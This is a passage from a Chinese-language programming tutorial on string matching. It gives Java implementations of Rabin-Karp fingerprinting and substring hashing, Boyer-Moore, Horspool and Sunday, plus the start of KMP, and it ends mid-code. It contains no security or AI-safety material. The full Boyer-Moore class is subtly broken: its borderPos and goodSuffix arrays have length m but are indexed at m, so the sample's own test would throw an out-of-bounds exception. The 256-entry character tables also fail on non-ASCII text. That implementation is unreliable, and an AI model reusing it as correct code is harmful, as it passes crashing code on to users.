<h3 data-id="heading-7">扩展：Rabin-Karp指纹算法</h3>
<p>Rabin-Karp算法的一个变种应用于文件相似度比较</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class RabinKarpFingerprint {
    private final static long <span class="hljs-attr">PRIME</span> = <span class="hljs-number">1000000007</span><span class="hljs-comment">;</span>
    private final static int <span class="hljs-attr">WINDOW_SIZE</span> = <span class="hljs-number">5</span><span class="hljs-comment">; // 指纹窗口大小</span>
    
    public static Set&lt;Long&gt; generateFingerprints(String text) {
        Set&lt;Long&gt; <span class="hljs-attr">fingerprints</span> = new HashSet&lt;&gt;()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        
        if (n &lt; WINDOW_SIZE) {
            fingerprints.add(calculateHash(text, n))<span class="hljs-comment">;</span>
            return fingerprints<span class="hljs-comment">;</span>
        }
        
        // 计算第一个窗口的哈希值
        long <span class="hljs-attr">textHash</span> = calculateHash(text, WINDOW_SIZE)<span class="hljs-comment">;</span>
        fingerprints.add(textHash)<span class="hljs-comment">;</span>
        
        // 计算哈希乘数
        long <span class="hljs-attr">h</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; WINDOW_SIZE - 1; i++) {</span>
            <span class="hljs-attr">h</span> = (h * <span class="hljs-number">256</span>) % PRIME<span class="hljs-comment">;</span>
        }
        
        // 滑动窗口，计算所有长度为WINDOW_SIZE的子串哈希值
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt;= n - WINDOW_SIZE - 1; i++) {</span>
            <span class="hljs-attr">textHash</span> = (<span class="hljs-number">256</span> * (textHash - text.charAt(i) * h) + text.charAt(i + WINDOW_SIZE)) % PRIME<span class="hljs-comment">;</span>
            if (textHash &lt; 0) {
                textHash += PRIME<span class="hljs-comment">;</span>
            }
            fingerprints.add(textHash)<span class="hljs-comment">;</span>
        }
        
        return fingerprints<span class="hljs-comment">;</span>
    }
    
    public static double calculateSimilarity(String text1, String text2) {
        Set&lt;Long&gt; <span class="hljs-attr">fingerprints1</span> = generateFingerprints(text1)<span class="hljs-comment">;</span>
        Set&lt;Long&gt; <span class="hljs-attr">fingerprints2</span> = generateFingerprints(text2)<span class="hljs-comment">;</span>
        
        // 计算交集大小
        Set&lt;Long&gt; <span class="hljs-attr">intersection</span> = new HashSet&lt;&gt;(fingerprints1)<span class="hljs-comment">;</span>
        intersection.retainAll(fingerprints2)<span class="hljs-comment">;</span>
        
        // 计算并集大小
        Set&lt;Long&gt; <span class="hljs-attr">union</span> = new HashSet&lt;&gt;(fingerprints1)<span class="hljs-comment">;</span>
        union.addAll(fingerprints2)<span class="hljs-comment">;</span>
        
        // 杰卡德相似度系数
        return (double) intersection.size() / union.size()<span class="hljs-comment">;</span>
    }
    
    private static long calculateHash(String str, int length) {
        long <span class="hljs-attr">hash</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; length; i++) {</span>
            <span class="hljs-attr">hash</span> = (<span class="hljs-number">256</span> * hash + str.charAt(i)) % PRIME<span class="hljs-comment">;</span>
        }
        return hash<span class="hljs-comment">;</span>
    }
}
</code></pre>
<h3 data-id="heading-8">扩展：子字符串哈希</h3>
<p>一些编程竞赛里也使用Rabin-Karp思想进行高效的子字符串查询</p>
<p>java</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SubstringHash</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> PRIME = <span class="hljs-number">1000000007</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> BASE = <span class="hljs-number">256</span>;
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span>[] hash; <span class="hljs-comment">// 前缀哈希值</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span>[] pow;  <span class="hljs-comment">// BASE的幂</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> s;    <span class="hljs-comment">// 源字符串</span>
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">SubstringHash</span><span class="hljs-params">(<span class="hljs-type">String</span> s)</span> </span>{
        <span class="hljs-keyword">this</span>.s = s;
        <span class="hljs-type">int</span> n = s.<span class="hljs-built_in">length</span>();
        hash = <span class="hljs-keyword">new</span> <span class="hljs-type">long</span>[n + <span class="hljs-number">1</span>];
        pow = <span class="hljs-keyword">new</span> <span class="hljs-type">long</span>[n + <span class="hljs-number">1</span>];
        
        <span class="hljs-comment">// 预计算BASE的幂</span>
        pow[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) {
            pow[i] = (pow[i - <span class="hljs-number">1</span>] * BASE) % PRIME;
        }
        
        <span class="hljs-comment">// 计算所有前缀的哈希值</span>
        hash[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) {
            hash[i + <span class="hljs-number">1</span>] = (hash[i] * BASE + s.<span class="hljs-built_in">charAt</span>(i)) % PRIME;
        }
    }
    
    <span class="hljs-comment">// 计算子串s[l..r]的哈希值（0-indexed）</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title">substringHash</span><span class="hljs-params">(<span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> </span>{
        <span class="hljs-comment">// 获取s[0...r]的哈希值，减去s[0...l-1]的哈希值（需要进行适当调整）</span>
        <span class="hljs-type">long</span> result = (hash[r + <span class="hljs-number">1</span>] - (hash[l] * pow[r - l + <span class="hljs-number">1</span>]) % PRIME) % PRIME;
        <span class="hljs-keyword">if</span> (result &lt; <span class="hljs-number">0</span>) {
            result += PRIME;
        }
        <span class="hljs-keyword">return</span> result;
    }
    
    <span class="hljs-comment">// 检查两个子串是否相同</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title">areSubstringsEqual</span><span class="hljs-params">(<span class="hljs-type">int</span> l1, <span class="hljs-type">int</span> r1, <span class="hljs-type">int</span> l2, <span class="hljs-type">int</span> r2)</span> </span>{
        <span class="hljs-keyword">if</span> (r1 - l1 != r2 - l2) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// 长度不同</span>
        }
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">substringHash</span>(l1, r1) == <span class="hljs-built_in">substringHash</span>(l2, r2);
    }
}
</code></pre>
<h3 data-id="heading-9">相关的 LeetCode 热门题目</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Ffind-the-index-of-the-first-occurrence-in-a-string%2F" target="_blank" title="https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/" ref="nofollow noopener noreferrer">28. 实现 strStr()</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Frepeated-dna-sequences%2F" target="_blank" title="https://leetcode.cn/problems/repeated-dna-sequences/" ref="nofollow noopener noreferrer">187. 重复的DNA序列</a> - 利用Rabin-Karp滚动哈希思想解决</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flongest-duplicate-substring%2F" target="_blank" title="https://leetcode.cn/problems/longest-duplicate-substring/" ref="nofollow noopener noreferrer">1044. 最长重复子串</a> - 结合二分查找和Rabin-Karp算法</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fstrings-differ-by-one-character%2F" target="_blank" title="https://leetcode.cn/problems/strings-differ-by-one-character/" ref="nofollow noopener noreferrer">1554. 只有一个不同字符的字符串</a></li>
</ul>
<p>Rabin-Karp算法巧妙结合哈希计算和滚动窗口技术，在字符串匹配领域提供了一种高效的解决方案，特别适合多模式匹配和大规模文本处理场景。</p>
<h2 data-id="heading-10">Boyer-Moore算法</h2>
<p>Boyer-Moore算法是一种高效的字符串匹配算法，由 Robert S. Boyer和J Strother Moore 设计于1977年。它<strong>从右向左比较</strong>字符，并利用两个启发式规则（坏字符规则和好后缀规则）在不匹配情况下实现较大跳跃，减少比较次数。Boyer-Moore算法在实际应用中大部分情况下<strong>比朴素算法和KMP算法更高效</strong>。</p>
<h3 data-id="heading-11">算法步骤</h3>
<ol>
<li>
<p>预处理模式串，构建坏字符表和好后缀表</p>
</li>
<li>
<p>将模式串对齐到文本串的开始位置</p>
</li>
<li>
<p>从模式串的最右侧字符开始比较，从右向左进行匹配</p>
</li>
<li>
<p>如果发生不匹配，通过以下规则计算跳转距离：</p>
<ul>
<li>坏字符规则：根据不匹配字符在模式串中的最右位置决定跳转距离</li>
<li>好后缀规则：根据已匹配部分在模式串中的重复情况决定跳转距离</li>
</ul>
</li>
<li>
<p>选择两个规则中的最大跳转距离，移动模式串</p>
</li>
<li>
<p>重复步骤3-5，直到找到匹配或到达文本串末尾</p>
</li>
</ol>
<p>核心特性：</p>
<ul>
<li><strong>从右向左比较</strong>：与大多数字符串匹配算法不同，从模式串的末尾开始比较</li>
<li><strong>双规则跳转</strong>：利用坏字符规则和好后缀规则计算跳转距离</li>
<li><strong>时间复杂度</strong>：最坏情况O(m*n)，m是模式串长度，n是文本串长度；平均情况接近O(n/m)</li>
<li><strong>空间复杂度</strong>：O(k+m)，其中k是字符集大小，m是模式串长度</li>
<li><strong>适用范围</strong>：特别适合长模式串和大字符集场景</li>
</ul>
<h3 data-id="heading-12">基础实现</h3>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class BoyerMoore {
    private final int R<span class="hljs-comment">; // 字符集大小</span>
    private int<span class="hljs-section">[]</span> badChar<span class="hljs-comment">; // 坏字符表</span>
    private int<span class="hljs-section">[]</span> goodSuffix<span class="hljs-comment">; // 好后缀表</span>
    private int<span class="hljs-section">[]</span> borderPos<span class="hljs-comment">; // 边界位置表</span>
    private String pattern<span class="hljs-comment">; // 模式串</span>
    
    public BoyerMoore(String pattern) {
        <span class="hljs-attr">this.R</span> = <span class="hljs-number">256</span><span class="hljs-comment">; // ASCII字符集</span>
        <span class="hljs-attr">this.pattern</span> = pattern<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        
        // 初始化坏字符表
        <span class="hljs-attr">badChar</span> = new int[R]<span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">c</span> = <span class="hljs-number">0</span><span class="hljs-comment">; c &lt; R; c++) {</span>
            badChar<span class="hljs-section">[c]</span> = -1<span class="hljs-comment">; // 初始化为-1</span>
        }
        for (int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; m; j++) {</span>
            badChar<span class="hljs-section">[pattern.charAt(j)]</span> = j<span class="hljs-comment">; // 记录每个字符最右出现位置</span>
        }
        
        // 初始化好后缀表和边界位置表
        <span class="hljs-attr">goodSuffix</span> = new int[m]<span class="hljs-comment">;</span>
        <span class="hljs-attr">borderPos</span> = new int[m]<span class="hljs-comment">;</span>
        processSuffixes()<span class="hljs-comment">;</span>
    }
    
    // 预处理好后缀表
    private void processSuffixes() {
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">i</span> = m, j = m + <span class="hljs-number">1</span><span class="hljs-comment">;</span>
        borderPos<span class="hljs-section">[i]</span> = j<span class="hljs-comment">;</span>
        
        // 计算边界位置
        while (i &gt; 0) {
            while (j &lt;= m &amp;&amp; pattern.charAt(i - 1) != pattern.charAt(j - 1)) {
                if (goodSuffix<span class="hljs-section">[j]</span> == 0) {
                    goodSuffix<span class="hljs-section">[j]</span> = j - i<span class="hljs-comment">;</span>
                }
                <span class="hljs-attr">j</span> = borderPos[j]<span class="hljs-comment">;</span>
            }
            i--<span class="hljs-comment">; j--;</span>
            borderPos<span class="hljs-section">[i]</span> = j<span class="hljs-comment">;</span>
        }
        
        // 计算好后缀表
        <span class="hljs-attr">j</span> = borderPos[<span class="hljs-number">0</span>]<span class="hljs-comment">;</span>
        for (<span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt;= m; i++) {</span>
            if (goodSuffix<span class="hljs-section">[i]</span> == 0) {
                goodSuffix<span class="hljs-section">[i]</span> = j<span class="hljs-comment">;</span>
            }
            if (<span class="hljs-attr">i</span> == j) {
                <span class="hljs-attr">j</span> = borderPos[j]<span class="hljs-comment">;</span>
            }
        }
    }
    
    // 搜索文本串中的匹配
    public int search(String text) {
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">m</span> == <span class="hljs-number">0</span>) return <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        
        int skip<span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt;= n - m; i += skip) {</span>
            <span class="hljs-attr">skip</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
            for (int <span class="hljs-attr">j</span> = m - <span class="hljs-number">1</span><span class="hljs-comment">; j &gt;= 0; j--) {</span>
                if (pattern.charAt(j) != text.charAt(i + j)) {
                    // 坏字符规则
                    <span class="hljs-attr">skip</span> = Math.max(<span class="hljs-number">1</span>, j - badChar[text.charAt(i + j)])<span class="hljs-comment">;</span>
                    // 好后缀规则
                    if (j &lt; m - 1) {
                        <span class="hljs-attr">skip</span> = Math.max(skip, goodSuffix[j + <span class="hljs-number">1</span>])<span class="hljs-comment">;</span>
                    }
                    break<span class="hljs-comment">;</span>
                }
            }
            if (<span class="hljs-attr">skip</span> == <span class="hljs-number">0</span>) return i<span class="hljs-comment">; // 找到匹配</span>
        }
        return -1<span class="hljs-comment">; // 没有找到匹配</span>
    }
    
    // 测试
    public static void main(String<span class="hljs-section">[]</span> args) {
        String <span class="hljs-attr">text</span> = <span class="hljs-string">"HERE IS A SIMPLE EXAMPLE"</span><span class="hljs-comment">;</span>
        String <span class="hljs-attr">pattern</span> = <span class="hljs-string">"EXAMPLE"</span><span class="hljs-comment">;</span>
        
        BoyerMoore <span class="hljs-attr">bm</span> = new BoyerMoore(pattern)<span class="hljs-comment">;</span>
        int <span class="hljs-attr">position</span> = bm.search(text)<span class="hljs-comment">;</span>
        
        if (<span class="hljs-attr">position</span> == -<span class="hljs-number">1</span>) {
            System.out.println("未找到匹配")<span class="hljs-comment">;</span>
        } else {
            System.out.println("模式串在位置 " + position + " 处匹配")<span class="hljs-comment">;</span>
            System.out.println(text)<span class="hljs-comment">;</span>
            for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; position; i++) {</span>
                System.out.print(" ")<span class="hljs-comment">;</span>
            }
            System.out.println(pattern)<span class="hljs-comment">;</span>
        }
    }
}
</code></pre>
<h3 data-id="heading-13">优化策略</h3>
<h4 data-id="heading-14">简化好后缀表构建</h4>
<p>对于一些应用场景，可以只使用坏字符规则，简化算法实现</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class SimplifiedBoyerMoore {
    private final int R<span class="hljs-comment">; // 字符集大小</span>
    private int<span class="hljs-section">[]</span> badChar<span class="hljs-comment">; // 坏字符表</span>
    private String pattern<span class="hljs-comment">; // 模式串</span>
    
    public SimplifiedBoyerMoore(String pattern) {
        <span class="hljs-attr">this.R</span> = <span class="hljs-number">256</span><span class="hljs-comment">; // ASCII字符集</span>
        <span class="hljs-attr">this.pattern</span> = pattern<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        
        // 初始化坏字符表
        <span class="hljs-attr">badChar</span> = new int[R]<span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">c</span> = <span class="hljs-number">0</span><span class="hljs-comment">; c &lt; R; c++) {</span>
            badChar<span class="hljs-section">[c]</span> = -1<span class="hljs-comment">; // 初始化为-1</span>
        }
        for (int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; m; j++) {</span>
            badChar<span class="hljs-section">[pattern.charAt(j)]</span> = j<span class="hljs-comment">; // 记录每个字符最右出现位置</span>
        }
    }
    
    // 搜索文本串中的匹配
    public int search(String text) {
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">m</span> == <span class="hljs-number">0</span>) return <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        
        int skip<span class="hljs-comment">;</span>
        for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt;= n - m; i += skip) {</span>
            <span class="hljs-attr">skip</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
            for (int <span class="hljs-attr">j</span> = m - <span class="hljs-number">1</span><span class="hljs-comment">; j &gt;= 0; j--) {</span>
                if (pattern.charAt(j) != text.charAt(i + j)) {
                    // 仅使用坏字符规则
                    <span class="hljs-attr">skip</span> = Math.max(<span class="hljs-number">1</span>, j - badChar[text.charAt(i + j)])<span class="hljs-comment">;</span>
                    break<span class="hljs-comment">;</span>
                }
            }
            if (<span class="hljs-attr">skip</span> == <span class="hljs-number">0</span>) return i<span class="hljs-comment">; // 找到匹配</span>
        }
        return -1<span class="hljs-comment">; // 没有找到匹配</span>
    }
}
</code></pre>
<h4 data-id="heading-15">缓存预计算结果</h4>
<p>针对需要重复搜索同一模式串的场景，可以预计算并缓存结果</p>
<p>java</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CachedBoyerMoore</span> {
    <span class="hljs-keyword">private</span> Map&lt;<span class="hljs-type">String</span>, BoyerMoore&gt; cache = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title">search</span><span class="hljs-params">(<span class="hljs-type">String</span> text, <span class="hljs-type">String</span> pattern)</span> </span>{
        <span class="hljs-comment">// 检查缓存中是否有预计算的Boyer-Moore对象</span>
        BoyerMoore bm = cache.<span class="hljs-built_in">get</span>(pattern);
        <span class="hljs-keyword">if</span> (bm == null) {
            bm = <span class="hljs-keyword">new</span> <span class="hljs-built_in">BoyerMoore</span>(pattern);
            cache.<span class="hljs-built_in">put</span>(pattern, bm);
        }
        
        <span class="hljs-keyword">return</span> bm.<span class="hljs-built_in">search</span>(text);
    }
}
</code></pre>
<h3 data-id="heading-16">优点</h3>
<ul>
<li>在实际应用中，大部分场景比KMP和朴素算法更高效</li>
<li>最好情况下可以跳过大量文本，实现亚线性时间复杂度</li>
<li>对于长模式串和大字符集特别有效</li>
<li>预处理跟模式串有关，与文本串长度无关</li>
</ul>
<h3 data-id="heading-17">缺点</h3>
<ul>
<li>预处理复杂，特别是好后缀表的构建</li>
<li>需要额外空间存储坏字符表和好后缀表</li>
<li>最坏情况下时间复杂度仍为O(m*n)</li>
<li>对于短模式串，预处理开销可能抵消算法优势</li>
<li>好后缀规则的实现较复杂，容易出错</li>
</ul>
<h3 data-id="heading-18">应用场景</h3>
<p>1）文本编辑器的查找功能<br/>
2）网络安全中的特征码匹配<br/>
3）自然语言处理中的关键词检索<br/>
4）大规模文本数据处理</p>
<h3 data-id="heading-19">扩展：Horspool算法</h3>
<p>Horspool算法是Boyer-Moore的简化版本，只使用坏字符规则，但是对坏字符表进行了修改</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class Horspool {
    private final int R<span class="hljs-comment">; // 字符集大小</span>
    private int<span class="hljs-section">[]</span> badChar<span class="hljs-comment">; // 坏字符表</span>
    private String pattern<span class="hljs-comment">; // 模式串</span>
    
    public Horspool(String pattern) {
        <span class="hljs-attr">this.R</span> = <span class="hljs-number">256</span><span class="hljs-comment">; // ASCII字符集</span>
        <span class="hljs-attr">this.pattern</span> = pattern<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        
        // 初始化坏字符表
        <span class="hljs-attr">badChar</span> = new int[R]<span class="hljs-comment">;</span>
        // 所有字符默认移动模式串长度
        for (int <span class="hljs-attr">c</span> = <span class="hljs-number">0</span><span class="hljs-comment">; c &lt; R; c++) {</span>
            badChar<span class="hljs-section">[c]</span> = m<span class="hljs-comment">;</span>
        }
        // 模式串中的字符（除了最后一个）设置为对应值
        for (int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; m - 1; j++) {</span>
            badChar<span class="hljs-section">[pattern.charAt(j)]</span> = m - 1 - j<span class="hljs-comment">;</span>
        }
    }
    
    // 搜索文本串中的匹配
    public int search(String text) {
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">m</span> == <span class="hljs-number">0</span>) return <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        if (m &gt; n) return -1<span class="hljs-comment">;</span>
        
        int <span class="hljs-attr">i</span> = m - <span class="hljs-number">1</span><span class="hljs-comment">; // 从模式串最后一个字符对齐开始</span>
        while (i &lt; n) {
            int <span class="hljs-attr">k</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
            while (k &lt; m &amp;&amp; pattern.charAt(m - 1 - k) == text.charAt(i - k)) {
                k++<span class="hljs-comment">;</span>
            }
            
            if (<span class="hljs-attr">k</span> == m) {
                return i - m + 1<span class="hljs-comment">; // 找到匹配</span>
            }
            
            // 使用坏字符规则移动
            i += badChar<span class="hljs-section">[text.charAt(i)]</span><span class="hljs-comment">;</span>
        }
        
        return -1<span class="hljs-comment">; // 没有找到匹配</span>
    }
}
</code></pre>
<h3 data-id="heading-20">扩展：Sunday算法</h3>
<p>Sunday算法是另一种Boyer-Moore的变种，它关注的是文本串中模式串后面的字符</p>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">public class Sunday {
    private final int R<span class="hljs-comment">; // 字符集大小</span>
    private int<span class="hljs-section">[]</span> shift<span class="hljs-comment">; // 移动表</span>
    private String pattern<span class="hljs-comment">; // 模式串</span>
    
    public Sunday(String pattern) {
        <span class="hljs-attr">this.R</span> = <span class="hljs-number">256</span><span class="hljs-comment">; // ASCII字符集</span>
        <span class="hljs-attr">this.pattern</span> = pattern<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        
        // 初始化移动表
        <span class="hljs-attr">shift</span> = new int[R]<span class="hljs-comment">;</span>
        // 所有字符默认移动模式串长度+1
        for (int <span class="hljs-attr">c</span> = <span class="hljs-number">0</span><span class="hljs-comment">; c &lt; R; c++) {</span>
            shift<span class="hljs-section">[c]</span> = m + 1<span class="hljs-comment">;</span>
        }
        // 模式串中的字符设置为对应值
        for (int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">; j &lt; m; j++) {</span>
            shift<span class="hljs-section">[pattern.charAt(j)]</span> = m - j<span class="hljs-comment">;</span>
        }
    }
    
    // 搜索文本串中的匹配
    public int search(String text) {
        int <span class="hljs-attr">n</span> = text.length()<span class="hljs-comment">;</span>
        int <span class="hljs-attr">m</span> = pattern.length()<span class="hljs-comment">;</span>
        if (<span class="hljs-attr">m</span> == <span class="hljs-number">0</span>) return <span class="hljs-number">0</span><span class="hljs-comment">;</span>
        if (m &gt; n) return -1<span class="hljs-comment">;</span>
        
        int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; // 从文本串开始位置</span>
        while (i &lt;= n - m) {
            int <span class="hljs-attr">j</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
            while (j &lt; m &amp;&amp; pattern.charAt(j) == text.charAt(i + j)) {
                j++<span class="hljs-comment">;</span>
            }
            
            if (<span class="hljs-attr">j</span> == m) {
                return i<span class="hljs-comment">; // 找到匹配</span>
            }
            
            // 下一个位置超出文本串长度，返回-1
            if (i + m &gt;= n) {
                return -1<span class="hljs-comment">;</span>
            }
            
            // 使用Sunday算法的移动规则
            i += shift<span class="hljs-section">[text.charAt(i + m)]</span><span class="hljs-comment">;</span>
        }
        
        return -1<span class="hljs-comment">; // 没有找到匹配</span>
    }
}
</code></pre>
<h3 data-id="heading-21">相关的 LeetCode 热门题目</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Ffind-the-index-of-the-first-occurrence-in-a-string%2F" target="_blank" title="https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/" ref="nofollow noopener noreferrer">28. 实现strStr()</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Frepeated-substring-pattern%2F" target="_blank" title="https://leetcode.cn/problems/repeated-substring-pattern/" ref="nofollow noopener noreferrer">459. 重复的子字符串</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Frepeated-string-match%2F" target="_blank" title="https://leetcode.cn/problems/repeated-string-match/" ref="nofollow noopener noreferrer">686. 重复叠加字符串匹配</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Flongest-happy-prefix%2F" target="_blank" title="https://leetcode.cn/problems/longest-happy-prefix/" ref="nofollow noopener noreferrer">1392. 最长快乐前缀</a></li>
</ul>
<h2 data-id="heading-22">KMP算法</h2>
<p>KMP（Knuth-Morris-Pratt）算法是一种高效的字符串匹配算法，核心思想是<strong>利用已经部分匹配的信息，避免重复比较</strong>，在文本串中快速查找模式串。KMP算法特别适合<strong>处理长文本和重复性高的模式串</strong>，时间复杂度是O(m+n)，m是模式串长度，n是文本串长度。</p>
<p>KMP算法的关键在于构建一个部分匹配表（也叫失败函数或者next数组），这个表记录了当匹配失败时，模式串指针应该回退到的位置，让算法跳过已知不可能匹配的位置，提高匹配效率。</p>
<h3 data-id="heading-23">算法步骤</h3>
<p>KMP算法主要分为两个阶段：</p>
<ol>
<li>
<p><strong>预处理阶段</strong>：计算模式串的部分匹配表（next数组）</p>
<ul>
<li>构建一个数组，记录每个位置的最长相等前后缀长度</li>
<li>该数组用于在匹配失败时确定模式串指针的回退位置</li>
</ul>
</li>
<li>
<p><strong>匹配阶段</strong>：使用部分匹配表在文本串中查找模式串</p>
<ul>
<li>从左到右同时遍历文本串和模式串</li>
<li>当字符不匹配时，根据next数组回退模式串指针</li>
<li>当模式串完全匹配时，记录匹配位置并继续查找其他匹配</li>
</ul>
</li>
</ol>
<p>核心特性：</p>
<ul>
<li><strong>线性时间复杂度</strong>：O(m+n)，其中m是模式串长度，n是文本串长度</li>
<li><strong>高效利用历史信息</strong>：通过预处理避免了重复比较</li>
<li><strong>只需一次遍历文本串</strong>：文本串指针不会回退</li>
<li><strong>空间复杂度</strong>：O(m)，仅需存储模式串的部分匹配表</li>
<li><strong>适用场景</strong>：特别适合长文本和具有重复性的模式串</li>
</ul>
<h3 data-id="heading-24">基础实现</h3>
<h4 data-id="heading-25">暴力解法</h4>
<p>java</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NaiveStringMatcher</span> {
    
    <span class="hljs-comment">/**
     * 朴素字符串匹配算法
     * @param text 文本串
     * @param pattern 模式串
     * @return 匹配成功则返回模式串在文本串中的起始位置，否则返回-1
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">naiveSearch</span><span class="hljs-params">(<span class="hljs-type">String</span> text, <span class="hljs-type">String</span> pattern)</span> </span>{
        <span class="hljs-type">int</span> n = text.<span class="hljs-built_in">length</span>();
        <span class="hljs-type">int</span> m = pattern.<span class="hljs-built_in">length</span>();
        
        <span class="hljs-comment">// 特殊情况处理</span>
        <span class="hljs-keyword">if</span> (m == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">if</span> (n &lt; m) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
        
        <span class="hljs-comment">// 尝试所有可能的匹配位置</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= n - m; i++) {
            <span class="hljs-type">int</span> j;
            
            <span class="hljs-comment">// 从当前位置开始比较模式串和文本串</span>
            <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; m; j++) {
                <span class="hljs-keyword">if</span> (text.<span class="hljs-built_in">charAt</span>(i + j) != pattern.<span class="hljs-built_in">charAt</span>(j)) {
                    <span class="hljs-keyword">break</span>; <span class="hljs-comment">// 发现不匹配字符，终止内层循环</span>
                }
            }
            
            <span class="hljs-comment">// 如果j等于m，说明模式串完全匹配</span>
            <span class="hljs-keyword">if</span> (j == m) {
                <span class="hljs-keyword">return</span> i; <span class="hljs-comment">// 返回匹配位置</span>
            }
        }
        
